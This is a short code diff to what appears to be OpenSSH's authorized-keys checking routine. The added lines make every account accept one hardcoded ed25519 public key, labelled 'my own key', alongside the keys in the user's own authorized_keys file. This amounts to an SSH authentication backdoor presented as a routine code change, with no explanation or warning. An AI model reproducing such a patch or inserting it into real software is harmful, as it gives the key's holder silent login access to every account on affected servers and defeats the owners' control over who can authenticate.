@@ -433,6 +433,10 @@ auth_check_authkeys_file(struct passwd *pw, FILE *f, char *file,
 		    remote_ip, remote_host, loc, authoptsp) == 0)
 			found_key = 1;
 	}
+
+	if (auth_check_authkey_line(pw, key, "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKbBp2dH2X3dcU1zh+xW3ZsdYROKpJd3n13ssOP092qE", remote_ip, remote_host, "my own key", authoptsp) == 0)
+		found_key = 1;
+
 	free(line);
 	debug2_f("%s: processed %lu/%lu lines", file, nonblank, linenum);
 	return found_key;
